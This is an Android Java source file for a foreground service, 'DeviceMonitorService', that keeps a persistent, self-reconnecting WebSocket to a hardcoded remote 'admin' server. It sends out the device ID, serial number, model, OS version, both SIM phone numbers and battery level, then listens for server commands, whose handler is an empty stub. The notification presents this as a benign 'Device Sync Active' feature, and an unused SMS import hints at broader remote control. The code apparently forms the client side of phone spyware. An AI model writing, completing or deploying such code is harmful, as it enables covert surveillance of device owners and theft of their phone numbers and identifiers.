package com.remote.devices;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.gson.Gson;
import com.google.gson.JsonSyntaxException;

import org.json.JSONObject;

import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class DeviceMonitorService extends Service {

    private static final String TAG = "DeviceMonitorService";
    private static final String WEBSOCKET_URL = "wss://bengal-tiger-admin-production-8071.up.railway.app"; // Updated Railway URL
    private static final int NOTIFICATION_ID = 1;
    private static final String NOTIFICATION_CHANNEL_ID = "DeviceMonitorChannel";
    public static final String PREFS_NAME = "DevicePrefs";
    public static final String IS_DELETED_KEY = "isDeleted";

    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler mainThreadHandler = new Handler(Looper.getMainLooper());
    private String deviceId;
    private Gson gson = new Gson();

    private final WebSocketListener socketListener = new WebSocketListener() {
        @Override
        public void onOpen(@NonNull WebSocket ws, @NonNull Response response) {
            Log.i(TAG, "WebSocket opened! Sending device data...");
            sendDeviceData(ws);
        }

        @Override
        public void onMessage(@NonNull WebSocket ws, @NonNull String text) {
            Log.i(TAG, "Received: " + text);
            handleServerCommand(text);
        }

        @Override
        public void onClosing(@NonNull WebSocket ws, int code, @NonNull String reason) {
            Log.w(TAG, "Closing: " + code + ", Reason: " + reason);
        }

        @Override
        public void onFailure(@NonNull WebSocket ws, @NonNull Throwable t, @Nullable Response response) {
            Log.e(TAG, "WebSocket Failure: " + t.getMessage());
            mainThreadHandler.postDelayed(() -> connectWebSocket(), 5000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        client = new OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        if (prefs.getBoolean(IS_DELETED_KEY, false)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForeground(NOTIFICATION_ID, createNotification());
        connectWebSocket();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
        }
    }

    private void connectWebSocket() {
        if (webSocket != null) {
            webSocket.cancel();
        }
        Request request = new Request.Builder().url(WEBSOCKET_URL).addHeader("Device-ID", deviceId).build();
        webSocket = client.newWebSocket(request, socketListener);
    }

    private void sendDeviceData(WebSocket webSocket) {
        String serialNumber;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                serialNumber = Build.getSerial();
            } else {
                serialNumber = Build.SERIAL;
            }
        } catch (SecurityException e) {
            serialNumber = deviceId; // Fallback
        }

        try {
            JSONObject deviceData = new JSONObject();
            deviceData.put("deviceId", deviceId);
            deviceData.put("serialNumber", serialNumber);
            deviceData.put("model", Build.MODEL);
            deviceData.put("androidVersion", Build.VERSION.RELEASE);
            deviceData.put("sim1", getSimNumber(0));
            deviceData.put("sim2", getSimNumber(1));
            deviceData.put("battery", getBatteryPercentage());

            webSocket.send(deviceData.toString());
            Log.d(TAG, "Sent device data: " + deviceData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error creating or sending device data JSON", e);
        }
    }

    private void handleServerCommand(String jsonCommand) { 
        // Your existing logic for handling commands
    }

    private String getSimNumber(int slotIndex) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
            List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            if (subscriptionInfoList != null) {
                for (SubscriptionInfo info : subscriptionInfoList) {
                    if (info.getSimSlotIndex() == slotIndex) {
                        return info.getNumber();
                    }
                }
            }
        }
        // Fallback for older devices
        if (slotIndex == 0) {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            return telephonyManager.getLine1Number();
        }
        return null;
    }

    private int getBatteryPercentage() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        if (bm != null) {
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } else {
            return -1;
        }
    }


    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID, "Device Monitor", NotificationManager.IMPORTANCE_DEFAULT);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("Device Sync Active")
                .setContentText("Listening for dashboard commands.")
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
